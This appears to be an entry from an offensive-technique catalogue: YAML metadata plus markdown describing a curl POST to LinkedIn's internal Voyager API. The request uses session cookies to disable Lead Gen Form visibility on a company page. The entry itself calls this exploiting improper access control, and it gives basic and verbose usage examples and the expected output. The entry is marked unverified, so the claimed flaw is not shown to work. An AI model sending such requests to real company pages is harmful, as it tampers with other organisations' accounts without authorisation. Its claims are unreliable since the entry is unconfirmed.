---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST
  'https://www.linkedin.com/voyager/api/voyagerOrganizationDashCompanies/{id}'
  -H 'Content-Type: application/json' -H 'Cookie: JSESSIONID=your_session;
  li_at=your_li_at_token' -d '{"leadGenFormsVisibility": "disabled"}'
name: curl-linkedin-api-manipulate
tags:
  - api
  - manipulation
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:29:56.898Z'
verified: false
validated: true
submitted: true
---
# curl-linkedin-api-manipulate

## Command

```bash
curl -X POST 'https://www.linkedin.com/voyager/api/voyagerOrganizationDashCompanies/{id}' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: JSESSIONID=your_session; li_at=your_li_at_token' \
  -d '{"leadGenFormsVisibility": "disabled"}'
```

## Description

This command uses curl to send a POST request to LinkedIn's Voyager API, exploiting improper access control to disable Lead Gen Form visibility on a company page. Use it when testing or demonstrating authorization bypasses in web APIs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `URL with {id}` | The API endpoint; replace {id} with company ID | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type for payload | Yes |
| `-H 'Cookie: ...'` | Includes authentication cookies for session | Yes |
| `-d '{...}'` | JSON payload to modify visibility | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.linkedin.com/voyager/api/voyagerOrganizationDashCompanies/12345' -H 'Content-Type: application/json' -H 'Cookie: JSESSIONID=abc; li_at=def' -d '{"leadGenFormsVisibility": "disabled"}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST 'https://www.linkedin.com/voyager/api/voyagerOrganizationDashCompanies/12345' -H 'Content-Type: application/json' -H 'Cookie: JSESSIONID=abc; li_at=def' -d '{"leadGenFormsVisibility": "disabled"}'
```

## Expected Output

Successful execution returns an HTTP 200 OK response, often with a JSON body confirming the update, such as {"status": "success"}. Failure due to auth issues shows 401/403 errors.

## Related

- [[Related Procedure|procedures/Manipulate-LinkedIn-Company-Page-Settings-via-Unauthorized-API-Call]]
